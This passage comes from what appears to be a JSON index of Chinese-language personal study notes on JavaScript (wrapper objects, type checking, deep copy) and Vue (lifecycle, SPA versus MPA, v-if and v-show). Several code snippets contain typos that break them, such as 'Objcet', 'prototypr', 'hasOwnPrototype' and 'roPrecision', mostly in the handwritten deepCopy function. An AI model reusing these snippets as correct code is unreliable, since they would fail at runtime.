wrapper\n\n所谓的包装对象，指的是与数值、字符串、布尔值分别相应的 Number、String、Boolean 三个原生对象。这三个原生对象可以把原始类型的值包装成对象。\n\n```javascript\nvar v1 = new Number(123);\nvar v2 = new String('abc');\nvar v3 = new Boolean(true);\n\ntypeof v1 // \"object\"\ntypeof v2 // \"object\"\ntypeof v3 // \"object\"\n\nv1 == 123 // true\nv2 == 'abc' // true\nv3 == true // true\n\nv1 === 123 // false\nv2 === 'abc' // false\nv3 === true // false\n```\n\n\n\n#### 1.2 设计目的\n\n包装对象的**设计目的**：\n\n1. 使得”**对象**“这种类型**可以覆盖 JavaScript 所有的值**，整门语言有一个**通用的数据模型**\n2. 使得**原始类型**的值有办法**调用自己的方法**\n\n\n\n#### 1.3 普通函数 和 构造函数 使用\n\n+ 作为普通函数调用（String(123) ）：将**任意类型**的值转为**原始类型**的值\n+ 作为构造函数使用（ new String(123) ）：可以将**原始类型**的值转为 **对象**\n\n~~~js\nString(123)      // \"123\"\nnew String(123)  // String {\"123\"}\n~~~\n\n\n\n#### 1.4 方法\n\n##### 1.4.1 实例方法\n\n三种包装对象都具有的、从 object 对象继承的方法：`valueOf()` 和 `toString()`\n\n###### 1.4.1.1 valueOf()\n\n返回包装对象**实例对应的原始类型**的值\n\n~~~js\nnew Number(123).valueOf()  // 123\nnew String(123).valueOf()  // \"123\"\nnew Boolean(123).valueOf() // true\n~~~\n\n\n\n###### 1.4.1.2 toString()\n\n返回**对应的字符串形式**\n\n~~~js\nnew Number(123).toString() // \"123\"\nnew String(123).toString() // \"123\"\nnew Boolean(123).toString() // \"true\"\n~~~\n\n\n\n##### 1.4.2 原始类型与实例对象的自动转换\n\n某些场合，**原始类型的值会自动当作包装对象调用**，即调用包装对象的属性和方法，此时 JavaScript 引擎会**自动将原始类型的值转为包装对象的实例，并在使用后立即销毁实例**。\n\n> eg：\n>\n> ~~~js\n> let str = \"abc\";  // === new String(str)\n> str.length // 3\n> \n> str.x = 123\n> str.x  // undefined\n> ~~~\n>\n> 如上述的 str 是一个字符串，本身不是对象，不能调用 length 属性。JavaScript 引擎**自动将其转为包装对象**，在这个对象上调用 length 属性。调用结束后，这个**临时对象就会被销毁**。**这就是原始类型与实例对象的自动转换**。\n>\n> 上述第二个例子，返回 undefined 的原因有：\n>\n> 1. 自动转换生成的包装对象是**只读的**\n> 2. 调用结束后，包装对象的实例会销毁，意味着下次调用字符串属性时，调用的是一个**新的对象**\n>\n> 如果要为字符串添加属性，只有在其原型对象 String.prototype 上定义\n\n\n\n##### 1.4.3 自定义方法\n\n除了原生的实例方法，包装对象还可以自定义方法和属性，供原始类型的值直接调用\n\n自定义的方法要加载 包装对象的 prototype 上\n\n> eg：\n>\n> ~~~js\n> Number.prototype.double = function(){\n>     return this.valueOf() + this.valueOf();\n> }\n> (123).double()  // 246  //要加上圆括号，否则后面的点运算符会被解释成小数\n> 123.0.double()\n> 123..double()\n> 123 .double()\n> ~~~\n\n\n\n#### 1.5 Boolean 对象\n\n##### 1.5.1 概述\n\n作为构造函数，其主要用于生成布尔值的包装对象实例\n\n~~~js\nlet b = new Boolean(false);\n\ntypeof b // \"object\"\nb.valueOf() // false\n\nif(new Boolean(false)){  // 因为 得到的是一个对象 所有是 true\n    console.log(true);\n}\n\n~~~\n\n##### 1.5.2 类型转换作用\n\n作为普通函数使用时，boolean 就单纯是一个工具方法**Boolean() 的 语法糖为 !!**\n\n~~~js\nBoolean(undefined) // false\nBoolean(null) // false\nBoolean(0) // false\nBoolean('') // false\nBoolean(NaN) // false\n\nBoolean(1) // true\nBoolean('false') // true\nBoolean([]) // true\nBoolean({}) // true\nBoolean(function () {}) // true\nBoolean(/foo/) // true\n~~~\n\n\n\n#### 1.6 Number 对象\n\n##### 1.6.1 概述\n\n作为构造函数时，用于生成值为数值的对象\n\n作为普通/工具 函数时，可以将任何类型的值转为数值\n\n~~~js\nlet n = new Number(1);\nNumber(true);  // 1\n~~~\n\n##### 1.6.2 静态属性\n\n直接定义在 Number 对象的属性，而不是定义在实例上的，即要用 Number.xxx 访问\n\n~~~js\nNumber.POSITIVE_INFINITY    // Infinity  无穷大\nNumber.NEGATIVE_INFINITY    // -Infinity 无穷小\nNumber.NaN                  // NaN 非数值\n\nNumber.MAX_VALUE            // 1.7976931348623157e+308 \nNumber.MAX_VALUE < Infinity // true\n\nNumber.MIN_VALUE            // 5e-324   最小正整数\nNumber.MIN_VALUE > 0        // true\n\nNumber.MAX_SAFE_INTEGER     // 9007199254740991   能精确表示的最大整数\nNumber.MIN_SAFE_INTEGER     // -9007199254740991  能精确表示的最小整数\n~~~\n\n##### 1.6.3 实例方法\n\n有四个实例方法，都与数值转换指定格式有关\n\n###### 1.6.3.1 Number.prototype.toString()\n\n部署了自己的 toString 方法，用来将一个数值转换为字符串形式；\n\ntoString() 括号里可以接收一个参数，表示输出的进制。默认是十进制。\n\n> 调用的时候也要注意 1.4.3 中的点运算符\n>\n> ~~~js\n> (10).toString( /2/8/16);  \"10/1010/12/a\"\n> ~~~\n\n###### 1.6.3.2 Number.prototype.toFixed()\n\n将一个数转为指定位数的小数（ 四舍五入 / 补零），然后返回这个小数对应的字符串\n\n\n\n###### 1.6.3.3 Number.prototype.toExponential()\n\n将一个数转为科学计数法形式，然后返回对应的字符串\n\n\n\n###### 1.6.3.4 Number.prototype.roPrecision()\n\n将一个数转为指定位数的有效数字（ 四舍五入 / 补零），然后返回对应的字符串\n\n##### 1.6.4 自定义方法\n\n在 Number.protorype 对象上自定义方法，会被 Number 的实例继承\n\n\n\n#### 1.7 String 对象\n\n##### 1.7.1 概述\n\n作为构造函数：生成字符串对象，其为一个类似数组的对象（很像数组，但不是数组）\n\n> 字符串`abc`对应的字符串对象，有数值键（`0`、`1`、`2`）和`length`属性，所以可以像数组那样取值\n\n```javascript\nnew String('abc')\n// String {0: \"a\", 1: \"b\", 2: \"c\", length: 3}\n\n(new String('abc'))[1] // \"b\"\n```\n\n作为普通函数：将任意类型的值转为字符串\n\n\n\n##### 1.7.2 静态方法\n\n###### String.fromCharCode()\n\n静态方法（即定义在对象本身，而不是定义在对象实例的方法），参数是一个或多个数值，代表 Unicode 码，返回值为这些码组成的字符串。\n\n~~~js\nString.fromCharCode() // \"\"\nString.fromCharCode(97) // \"a\"\nString.fromCharCode(104, 101, 108, 108, 111) // \"hello\"\n~~~\n\n> 该方法不支持 Unicode 码点大于`0xFFFF`的字符\n\n##### 1.7.3 实例属性\n\n###### String.prototype.length\n\n##### 1.7.4 实例方法\n\n###### String.prototype.charAt()\n\n返回指定位置的字符：`‘abc’.charAt(1) == 'abc'[1] = 'b'`\n\n###### String.prototype.charCodeAt()\n\n返回字符串指定位置的 Unicode 码：`‘abc’.charCodeAt(1) == 98`\n\n###### String.prototype.concat()\n\n用于连接两个字符串，返回一个新字符串，不改变原字符串，可以有多个参数：`s1.concat(s2),'a'.concat('b', 'c')`\n\n###### String.prototype.slice()\n\n从原字符串取出子字符串并返回，不改变原字符串。它的第一个参数是子字符串的开始位置，第二个参数是子字符串的结束位置(不含)\n\n###### String.prototype.substring()\n\n同上\n\n###### String.prototype.substr()\n\n同上\n\n###### String.prototype.indexOf()\n\n用于确定一个字符串在另一个字符串中第一次出现的位置，返回结果是匹配开始的位置；\n\n还可以接受第二个参数，表示从该位置开始向后匹配。\n\n###### String.prototype.lastIndexOf()\n\n从尾部开始匹配，第二个参数表示从该位置起向前匹配\n\n###### String.prototype.trim()\n\n去除字符串两端的空格，返回一个新字符串，不改变原字符串；\n\n去除的不仅是空格，还包括制表符（`\\t`、`\\v`）、换行符（`\\n`）和回车符（`\\r`）\n\n###### String.prototype.toLowerCase()，String.prototype.toUpperCase()\n\n都返回一个新字符串，不改变原字符串\n\n###### String.prototype.match()\n\n确定原字符串是否匹配某个子字符串，返回一个数组，成员为匹配的第一个字符串。如果没有找到匹配，则返回`null`\n\n返回的数组还有`index`属性和`input`属性，分别表示匹配字符串开始的位置和原始字符串\n\n###### String.prototype.search()\n\n基本等同于`match`，但是返回值为匹配的第一个位置。如果没有找到匹配，则返回`-1`\n\n还可以使用正则表达式作为参数。\n\n###### String.prototype.replace()\n\n用于替换匹配的子字符串，一般情况下只替换第一个匹配（除非使用带有`g`修饰符的正则表达式）\n\n###### String.prototype.split()\n\n按照给定规则分割字符串，返回一个由分割出来的子字符串组成的数组\n\n> ~~~js\n> 'a|b|c'.split('|') // [\"a\", \"b\", \"c\"]\n> 'a|b|c'.split('') // [\"a\", \"|\", \"b\", \"|\", \"c\"]\n> 'a|b|c'.split() // [\"a|b|c\"]\n> ~~~\n\n###### String.prototype.localeCompare()\n\n用于比较两个字符串。\n\n返回一个整数，如果小于0，表示第一个字符串小于第二个字符串；如果等于0，表示两者相等；如果大于0，表示第一个字符串大于第二个字符串\n\n还可以有第二个参数，指定所使用的语言（默认是英语\n\n> ~~~js\n> 'apple'.localeCompare('banana') // -1\n> 'apple'.localeCompare('apple') // 0\n> ~~~\n>\n> \n\n### 2. 隐式调用\n\n简单说就是自动调用一些方法，而这些方法像钩子一样可以在外部修改，从而改变既定行为。\n\n#### 2.1 数据类型转换 toString 和 valueOf\n\n~~~js\nlet a = {\n    i: 1,\n    valueOf: function () {      // 改成 => 就不行 记得看 this 指向\n        console.log(\"valueof\")\n        return this.i++;\n    },\n    toString: function () {\n        console.log(\"tostring\");\n        return this.i++;\n    }\n}\n\na == 1  // \"valueof\"  true\nNumber(a)  // \"valueof\" 2\nString(a)  // \"tostring\" \"3\"\nBoolean(a) // true  因为是对象\na + 1     // \"valueof\" 5\nString(a) + 1 // \"toString\" \"61\"\n\nlet b = {\n    i: 1,\n    valueOf: function () {\n        console.log(\"valueof\")\n        return {};\n    },\n    toString: function () {\n        console.log(\"tostring\");\n        return {};\n    }\n}\n\nNumber(b) // \"valueof\" \"tostring\" Uncaught TypeError\nb == 1    // \"valueof\" \"tostring\" Uncaught TypeError\nString(b) // \"tostring\" \"valueof\" Uncaught TypeError\nb == \"1\"  // \"valueof\" \"tostring\" Uncaught TypeError\n~~~\n\n在相等 **==** 运算符 / 加号 **+** 操作中，（null 除外）对象会**先调用 valueOf** ，如果**返回值是对象，就会调用 toString**， 然后用返回的值进行比较 / 加号操作。\n\nNumber 和 String 方法中 ，**Number 会先调用 valueOf 后调用 toString**，**String 则相反**。\n\n#### 2.2 DOM2 事件中的 handleEvent\n\n~~~js\nlet eventObj = {\n    a: 1,\n    handleEvent: function(e){\n        console.log(this, e);  // eventObj ， 事件对象\n    }\n}\n\ndocument.addEventListener('click',eventObj);\n~~~\n\naddEventListener 第二个参数除了函数外还可以是一个对象，事件触发后会执行对象的 handleEvent 方法，方法执行时的 this 指向 eventObj，你可以把想传入的数据绑定在 eventObj 对象上\n\n#### 2.3 JSON 对象 toJSON\n\n#### 2.4 promise 对象的 then\n\n#### 2.5 对象属性存取器 get 和 set\n\n#### 2.6 遍历器接口 Symbol.iterator\n","tags":["js"],"categories":["furtherNotes"]},{"title":"判断数据类型","url":"/furtherNotes/further/01 判断数据类型","content":"\n>\n> 通过 手写深拷贝 的 数据的类型判断 方法有点感兴趣\n>\n> https://juejin.cn/post/6992848107004231687\n>\n> 有问题：https://juejin.cn/post/7004778999226302477\n>\n> 原理：https://juejin.cn/post/6844904081803182087\n\n\n## 4种 判断数据类型的方式\n\n### 0. 数据类型\n\n数据类型：Undefined、Null、Boolean、Number、String、Symbol、BigInt、Object\n\n> Symbol 是 es6 中引入的一种 原始数据 类型，表示独一无二的值\n>\n> BigInt 是 es2020 引入的用于解决 js 中数字只能到 53 个二进制位 的问题\n\n1. 基本数据类型\n\n   Undefined、Null、Boolean、Number、String、Symbol（es6）、BigInt（es2020）\n\n2. 引用数据类型\n\n   Object：Array、Function、Date、RegExp、Error、Arguments 等\n\n### 1. typeof\n\n#### 1.1 使用\n\ntypeof 基本类型 返回相应的类型，除了 null 返回 object\n\ntypeof 引用类型 返回 object ，除了 函数 返回 function\n\n~~~js\ntypeof '5'             // string\ntypeof 5               // number\ntypeof null            // object  ！\ntypeof undefined       // undefined\ntypeof true            // boolean\ntypeof Symbol('5')     // symbol\ntypeof 5n              // bigint\ntypeof new Object();   // object\ntypeof new Function(); // function ！\n~~~\n\n**Q:** typeof 作用于未定义的变量，会报错吗？\n\nA: 不会报错，返回\"undefined\"\n\n**Q:** typeof Number(1) 的返回值？\n\nA: \"number\"。\n\n> typeof Nmuber(1)  // ‘number’\n>\n> typeof String(‘1’)    // ‘string’\n>\n> typeof Array(1,2) === typeof new Array(1,2)  // ‘object’\n>\n> Number 和 String 作为普通函数调用的时候，把参数转化为相应的原始数据类型，也就是**类似于做一个强制类型转换的操作**，而不是默认当做构造函数调用。注意和 Array 区分，Array(...) 等价于 new Array(...)\n\n**Q:** typeof new Number(1) 的返回值\n\nA: ‘object’\n\n#### 1.2 原理\n\n不同对象**在底层都表示为二进制**，在 Javascript 中二进制低三位存储其类型信息\n\n+ 000：对象\n\n+ 001：整数\n\n+ 010：浮点数\n\n+ 100：字符串\n\n+ 110：布尔值\n\n  null：全0\n\n### 2. instanceof\n\n#### 2.1 使用\n\n+ 是用来判断 变量的原型链上是否有构造函数的 prototype 属性（两个对象是否属于原型链的关系），不一定能获取对象的具体类型\n\n+ 不适用判断原始类型的值，只能用于判断对象是否从属关系\n\n> instanceof 的结果并不一定是可靠的，因为在 **ECMAScript7** 规范中可以通 过自定义 Symbol.hasInstance 方法来覆盖默认行为\n\n~~~js\n3 instanceof Number // false \n'3' instanceof String // false\ntrue instanceof Boolean // false\n\n[] instanceof Array; // true\n[] instanceof Object; // true\n\nvar date = new Date()   date instanceof Date // true \nvar number = new Number()  number instanceof Number // true \nvar string = new String()  string instanceof String // true \n\n// 空对象{} 的判断\nlet obj1 = {}  obj1 instanceof Object  // true\nlet obj2 = Object.create(null)  obj2 instanceof Object  // false\nlet obj3 = Object.create({})  obj3 instanceof Object // true\n~~~\n\n#### 2.2 原理\n\n`instanceof`  判断 变量的**原型链上是否有构造函数的 prototype 属性**\n\n<img src=\"https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-user-assets/2020/3/5/170a84f72826fa18~tplv-t2oaga2asx-watermark.awebp\">\n\n\n\n### 3. __proto\\_\\_.constructor\n\n原理：每一个实例对象都可以通过 constructor 来访问它的构造函数，其实也是根据原型链的原理来的\n\n> 由于undefined和null是无效的对象，因此是没有constructor属性的,这两个值不能用这种方法判断.、\n\n~~~js\n'5'.__proto__.constructor === String // true  String 应该是类型\n[5].__proto__.constructor === Array // true \n\nlet date = new Date(); date.__proto__.constructor === \tDate // true\nundefined.__proto__.constructor // Cannot read property '__proto__' of undefined\nnull.__proto__.constructor // Cannot read property '__proto__' of undefined\n~~~\n\n\n\n### 4. Object.prototype.toString\n\n+ 返回对象的类型字符串，隐藏可以用来判断一个值的类型\n+ 因为实例对象可能会自定义 toString 方法，会覆盖 Object.prototype.toString，所以在使用时，最好加上 call\n+ 所有数据类型都可以用这个方法进行检测，且十分精准\n\n~~~js\nObject.prototype.toString.call('5') // \"[object String]\"  字符串\nObject.prototype.toString.call(5) // [object Number]\nObject.prototype.toString.call([5]) // [object Array]\nObject.prototype.toString.call(true) // [object Boolean]\nObject.prototype.toString.call(undefined) // [object Undefined]\nObject.prototype.toString.call(null) // [object Null]\nObject.prototype.toString.call(new Function()); // [object Function]\nObject.prototype.toString.call(new Date()); // [object Date]\nObject.prototype.toString.call(new RegExp()); // [object RegExp]\nObject.prototype.toString.call(new Error()); // [object Error]\n~~~\n\n\n\n### 5. 总结\n\n+ typeof 适合基本类型和 function 类型的检测，无法判断 null 和 object\n+ instanceof 适合自定义对象，也可以用来检测原生对象，在不同的 iframe 和 window 间检测时失效，还需要注意 Object.create(null) 对象的问题\n+ constructor 基本能判断所有类型，除了 null 和 undefined，但是 constructor 容易被修改，也不能跨 iframe 使用\n+ toString 能判断所有类型，可将其封装为全能的 DateType() 判断所有数据类型","tags":["js"],"categories":["furtherNotes"]},{"title":"深拷贝浅拷贝","url":"/furtherNotes/further/01 深拷贝浅拷贝","content":"\n> 面试专栏：https://vue3js.cn/interview/JavaScript/copy.html#%E4%B8%80%E3%80%81%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B%E5%AD%98%E5%82%A8\n>\n> 深拷贝浅拷贝：https://juejin.cn/post/7013603488315736072\n>\n> messagechannel：https://www.jianshu.com/p/4f07ef18b5d7\n>\n> 深拷贝函数：https://www.cnblogs.com/wangyong1997/p/13577725.html\n\n## 深拷贝 与 浅拷贝\n\n在日常生\t产环境当中，使用完美方案—`lodash.cloneDeep`，面试问起来的话，重点使用递归实现，JSON、Object.assgin、MessageChannel都可以作为补充。\n\n### 1. 数据类型存储\n\n+ 基本类型：栈内存\n\n  > number、null、undefined、boolean、string、symbol、bigint\n\n+ 引用类型：堆内存，引用数据类型的变量是一个指向堆内存中事对象的引用，存在栈中\n\n  > function、object、array、date、regexp、map、set\n\n\n\n+ 浅拷贝：基本类型，拷贝数据；引用类型，拷贝内存地址；即共用引用类型数据。\n\n  > `=` 从第一层的引用类型就是共享内存地址\n  >\n  > 浅拷贝是**拷贝一层**，深层次的引用类型则共享内存地址\n  >\n  > **修改第一层的基本数据类型，是不会修改到其他对象的；**\n  >\n  > **但是修改第一层引用类型下面的值时，全都是在操作一个内存地址的值**\n\n+ 深拷贝：基本类型 和 引用类型都拷贝数据，不存在共用数据的现象\n\n  > 修改任何对象的属性都不会改变另一个对象的属性\n\n\n\n前提为拷贝类型为引用类型的情况下：\n\n- 浅拷贝是拷贝一层，属性为对象时，浅拷贝是复制，两个对象指向同一个地址\n- 深拷贝是递归拷贝深层次，属性为对象时，深拷贝是新开栈，两个对象指向不同的地址\n\n\n\n### 2. 浅拷贝\n\n1. `Object.assign(target,source[,source2])`  // Object Array\n2. 扩展运算符 `...`  // Object Array\n3. `Array.prototype.slice --- arrO.slice(0)`  // Array\n4. `Array.prototype.concat --- arrO.concat()` // Array\n\n~~~js\nlet obj = {\n    a:'aaa1',\n    b:{\n        b1:'bbb1'\n    }\n}\nlet arr = [0,[10,11]]\n\n// =\nlet obj2 = obj;\nobj2.a = 'aaa2'; // obj2.a === obj.a = 'aaa2'\n\n// assign\nlet obj3 = Object.assign({},obj);\nobj3.a = 'aaa3';     // obj3.a = 'aaa3'  obj.a = 'aaa2'  // obj.a 基本类型\nobj3.b.b1 = 'bbb3';  // obj3.b === obj.b = { b1: 'bbb3'}  // obj 跟着变化\n\n// ...\nlet obj4 = {...obj};\nobj4.a = 'aaa4';    // obj.a = 'aaa2' obj4.a = 'aaa4'\nobj4.b.b1 = 'bbb4'; // obj.b.b1 === obj4.b.b1 = 'bbb4'\n\n// slice\nlet arr2 = arr.slice(0);\narr2[0] = 20;    // arr2[0] = 20  arr[0] = 0\narr2[1][1] = 22; // arr[1] === arr2[1] = [11,22];\n\n//concat\nlet arr3 = arr.concat();\n~~~\n\n\n\n### 3. 深拷贝\n\n1. `JSON.parse(JSON.stringify())`\n2. `Jquery.extend()`\n3. `_.cloneDeep()`\n4. `MessageChannel`\n5. 手写循环递归\n\n\n\n~~~js\n// JSON.parse(JSON.stringify(obj))\nlet obj5 = JSON.parse(JSON.stringify(obj))\nobj5.a = 'aaa5';     // obj5.a = 'aaa5' obj.a = 'aaa2'\nobj5.b.b1 = 'bbb5';  // obj5.b.b1 = 'bbb5'  obj.b.b1 = 'bbb4'\n\n// jquery.extend\nconst $ = require('jquery');\nlet obj6 = $.extend(true, {}, obj);\n\n// _.cloneDeep\nconst _ = require('lodash');\nlet obj7 = _.cloneDeep(obj)\n~~~\n\nJSON.parse 的问题：\n\n+ 会忽略 `undefined` 和 `symbol`\n+ 不可以对 `Function ` 进行拷贝，因为 JSON 格式字符串不支持 Function，在序列化时会自动删除\n+ 不支持循环对象的拷贝（对象的某个属性的值为其自己）\n+ 不能正确处理new Date\n+ 不能处理正则\n+ 不能处理 new Error()\n\n但遇到的深拷贝的场景很少，而且 99% 用 JSON.stringify 就可以解决\n\n##### 3. ! `_.cloneDeep`\n\n> 这是最最最最完美的深拷贝的方式，它已经将会出现问题的各种情况都考虑在内了，所以在日常项目开发当中，建议使用这种成熟的解决方案.\n>\n> 其实lodash解决循环引用的方式，就是用一个栈记录所有被拷贝的引用值，如果再次碰到同样的引用值的时候，不会再去拷贝一遍，而是利用之前已经拷贝好的。\n\n\n\n##### 4.`MessageChannel`\n\nMessageChannel 允许我们创建一个新的消息通道，并通过其 postMessage 发送数据，ommessage 接收数据\n\n> 简单来说，`MessageChannel`创建了一个通信的管道，这个管道有两个端口，每个端口都可以通过`postMessage`发送数据，而一个端口只要绑定了`onmessage`回调方法，就可以接收从另一个端口传过来的数据。\n\n###### 4.1 使用 MessageChannel\n\n~~~js\nconst channel = new MessageChannel();   // 创建了一个管道\nvar port1 = channel.port1;\nvar port2 = channel.port2;             // 获取实例的两个端口 只读\nport1.onmessage = function(event) {\n    console.log(\"port1收的数据：\" + event.data);\n}\nport2.onmessage = function(event) {\n    console.log(\"port2收的数据：\" + event.data);\n}\nport1.postMessage(\"port1发的数据\");  // port2收的数据：port1发的数据\nport2.postMessage(\"port2发的数据\");\n~~~\n\n\n\n###### 4.2 使用其进行深拷贝\n\nMessageChannel 的 postMessage 传递数据也是 深拷贝的，与 web worker 的postMessage 一样，而且可以**拷贝 undefined 和 循环引用的对象**\n\n但拷贝**有函数的对象时，会报错**。而且是在 **异步**的\n\n~~~js\nfunction deepcopy(obj){\n    return new Promise((resolve) => {\n        const {port1, port2} = new MessageChannel();\n        // port2将port1 传过来的 obj 返回出去 obj此时就是深拷贝后的\n        port2.onmessage = event => resolve(event.data); \n        port1.postMessage(obj);\n    })\n}\n// copy 就是传出来的 深拷贝后的值\ndeepcopy(obj).then((copy) => {\n    let copyobj = copy;  // copyobj 已经不等于 obj了 copy == copyobj ！= obj\n})\n~~~\n\n\n\n##### 5. 手写循环递归\n\n> 判断一个对象的字段是否引用了这个对象或这个对象的任意父级，如果引用了父级，那么就直接返回同级的新对象，反之，进行递归的那套流程。\n\n~~~js\nfunction deepCopy(obj, cache = new WeakMap()){\n    if(Object.prototypr.toString.call(obj) === '[object Function]'){\n        return new Function('return ' + obj.toString()).call(this);\n    }\n    if(obj == null || typeof obj !== 'object'){  \n        // == null 包含了 null 和 undefined\n        // typeof 除 function 外的引用类型都是 object\n        // 所以 不是funciton又不是其他引用类型的话 就是基本数据类型了\n        return obj;\n    }\n    // 以下是对 除 function 外的引用类型的处理\n    if(Object.prototype.toString.call(obj) === '[object Date]'){\n        return new Date(obj);\n    }\n    if(Objcet.prototype.toString.call(obj) === '[object RegExp]'){\n        return new RegExp(obj);\n    }\n    if(Objcet.prototype.toString.call(obj) === '[object Error]'){\n        return new Error(obj);\n    }\n    if(cache.get(obj)){\n        return cache.get(obj);\n    }\n    let copyObj = Object.prototype.toString.call(obj) === '[object Array]' ? [] : {};\n    // let copyObj = Array.isArray(obj) ? [] : {};\n    // let copyObj = new obj.constructor();\n    cache.set(obj,copyObj); // 此时 copyObj 还没有数据，下面会进行添加\n    for(const key in obj){\n    \tif(obj.hasOwnPrototype(key)){  // 用for in为什么还要判断key是否为obj的自身属性\n// 辉哥说 因为 for in 遍历的是 可迭代的变量，当在其原型链上时，也是可迭代的，但是却不是本身属性\n            // 递归拷贝\n            copyObj[key] = deepCopy(obj[key],cache)\n        }\n    }\n    return copyObj;\n}\n~~~\n\n\n\n","tags":["js"],"categories":["furtherNotes"]},{"title":"单页面、多页面应用","url":"/furtherNotes/further/06 单页面应用和多页面应用","content":"\n> 参考链接\n>\n> https://www.jianshu.com/p/4c9c29967dd6\n>\n> https://vue3js.cn/interview/vue/spa.html#%E4%BA%8C%E3%80%81spa%E5%92%8Cmpa%E7%9A%84%E5%8C%BA%E5%88%AB\n\n## 单页面应用与多页面应用的区别\n\n\n\n### 1. 多页面应用 MPA\n\n多页面应用(multiPage-Page application)：每个页面都是一个主页面，都是独立的，当在访问另一个页面的时候，都需要重新加载 html、css、js 文件。**每一次页面跳转时，后台服务器都会返回一个新的 html 文档。**\n\n+ 优点：\n\n  + **首屏时间快**\n\n    页面首个屏幕的内容展现的时间，当访问页面时，服务器返回一个 html，页面就会展示出来，这个过程<u>只经历了一个 http 请求，所以页面展示的速度非常快</u>。\n\n  + **seo 效果好**\n\n    搜索引擎在做页面排名的时候，要根据页面内容才能给网页权重，来进行网页的排名。<u>搜索引擎是可以识别 html</u> 内容的，而我们在每个页面所有的内容都放在 html 中，所以多页面应用seo排名效果好。\n\n+ 缺点：\n\n  + **页面切换慢**\n\n    <u>每次跳转都需要发出一个 http 请求</u>，如果网络比较慢，在页面之间来回跳转时，就会有明显的卡顿。\n\n    \n\n### 2. 单页面应用 SPA\n\n单页面应用(single-page application)，通过动态重写当前页面来与用户交互，这种方法避免了页面之间切换打断用户体验在单页应用中，所有必要的代码（`HTML`、`JavaScript`和`CSS`）都通过单个页面的加载而检索，或者根据需要（通常是为响应用户操作）动态装载适当的资源并添加到页面，页面在任何时间点都不会重新加载。\n\n+ 优点：\n\n  + **页面切换快**\n\n    页面每次切换跳转时，<u>不需要做 html 文件的请求，这样就节约了很多 http 发送时延</u>。\n\n+ 缺点：\n\n  + **首屏时间稍慢**\n\n    首屏时需要请求一次`html`，同时还要发送一次`js`请求，两次请求回来了，首屏才会展示出来\n\n  + **seo 差**\n\n    因为搜索引擎只认识`html`里的内容，不认识`js`的内容，<u>而单页应用的内容都是靠`js`渲染生成出来的，搜索引擎不识别这部分内容</u>，也就不会给一个好的排名，会导致单页应用做出来的网页在百度和谷歌上的排名差。\n\n> vue 提供了一些其他技术来解决了单页面的缺点，比如服务端渲染 ssr，通过这些技术可以完美解决这些缺点。\n\n\n\n### 3. 比较\n\n|                                | 多页应用模式MPA                                              | 单页应用模式SPA                                              |\n| ------------------------------ | ------------------------------------------------------------ | ------------------------------------------------------------ |\n| 构成                           | 由多个完整页面构成                                           | 一个外壳页面和多个页面片段构成                               |\n| **跳转方式**                   | **整页刷新**：页面之间的跳转是从一个页面跳转到另一个页面     | **局部刷新**：页面片段之间的跳转是把一个页面片段删除或隐藏，加载另一个页面片段并显示出来。这是片段之间的模拟跳转，并没有开壳页面 |\n| **跳转后公共资源是否重新加载** | 是                                                           | 否                                                           |\n| **URL模式**                    | **历史模式**<br />`http://xxx/page1.html 和 http://xxx/page2.html` | **哈希模式**<br />`http://xxx/shell.html#page1 和 http://xxx/shell.html#page2` |\n| **页面切换**                   | 页面间切换加载慢，不流畅，用户体验差，特别是在移动设备上     | 页面片段间的切换快，用户体验好，包括在移动设备上             |\n| 能否实现转场动画               | 无法实现                                                     | 容易实现（手机`app`动效）                                    |\n| **页面间传递数据**             | 依赖`URL、cookie`或者`localstorage`，实现麻烦                | 因为在一个页面内，页面间传递数据很容易实现(这里是我补充，父子之间传值，或`vuex`或`storage`之类) |\n| **搜索引擎优化（SEO）**        | 可以直接做                                                   | 需要单独方案做，有点麻烦，可通过 ssr 改善                    |\n| 特别适用的范围                 | 需要对搜索引擎友好的网站                                     | 对体验要求高的应用，特别是移动应用                           |\n|                                |                                                              |                                                              |\n| 开发难度                       | 低一些，框架选择容易                                         | 高一些，需要专门的框架来降低这种模式的开发难度               |\n\n","tags":["vue"],"categories":["furtherNotes"]},{"title":"vue生命周期","url":"/furtherNotes/further/04 vue 生命周期","content":"\n## vue 生命周期\n\n+ beforeCreate：<u>data 和 methods 中的数据还没有初始化</u>\n+ created：<u>data 和 methods 已经被初始化了</u>，**要调用 methods 或 操作 data 中的数据最早只能在这**\n+ beforeMount：（模板在内存中编译好，还未挂载到页面上）<u>页面的元素还没被替换过来，还是之前的模板字符串</u>，[render 函数在这被调用，生成虚拟 DOM ]\n+ mounted：<u>内存中的模板已经真实的挂载到页面中</u>，是实例创建期间的最后一个生命周期，执行完 mounted 就表示实例已经被完全创建好了，**要通过某些插件操作页面上的 DOM 节点，最早要在这**\n+ beforeUpdate：组件运行阶段的生命周期，<u>页面中显示的数据还未更新，但data数据是最新的</u>，[数据更新后，新的虚拟 DOM 生成，但还没跟旧虚拟 DOM 对比补丁]\n+ update：<u>页面和data已经保持同步了</u>，[新的虚拟 DOM 对比补丁后，进行真实 DOM 的更新]\n+ beforeDestory：vue实例进入销毁阶段，实例上所有的 data methods 过滤器 指令<u>都处于可用状态</u>，此时还未真正执行销毁\n+ destoryed：组件已经被完全销毁，此时组件中所有的 data methods… 都<u>已经不可用了</u>\n\n \n\n+ activated：keep-alive 专属，组件被激活时调用\n+ deactivated：keep-alive 专属，组件被销毁时调用\n\n\n\n**Q：异步请求在哪里发起？**\n\n可以在钩子函数 created、beforeMount、mounted 中进行异步请求，因为这三个函数中，**data 已经创建，可以将服务器端返回的数据进行赋值**\n\n如果异步请求不需要依赖 dom 推荐在 created 函数中调用异步请求，优点有：\n\n+ 能更快获取到服务器数据，减少页面 loading 时间\n+ ssr 不支持 beforeMount、mounted 钩子函数，所以放在 created 中有助于一致性\n\n","tags":["vue"],"categories":["furtherNotes"]},{"title":"v-if、v-for、v-show","url":"/furtherNotes/further/05 v-if 与 v-show v-for","content":"\n> 参考链接：\n>\n> https://vue3js.cn/interview/vue/show_if.html#%E4%B8%80%E3%80%81v-show%E4%B8%8Ev-if%E7%9A%84%E5%85%B1%E5%90%8C%E7%82%B9\n\n> https://juejin.cn/post/6984210440276410399#heading-18\n>\n> https://vue3js.cn/interview/vue/if_for.html#%E4%BA%8C%E3%80%81%E4%BC%98%E5%85%88%E7%BA%A7\n\n## v-if 与 v-show 的区别、v-if 为什么不建议与 v-for 一起使用\n\n### 1. v-show 与 v-if 的区别\n\n+ 控制手段：\n\n  + v-show：显示隐藏式为该元素**添加 display 属性**，dom 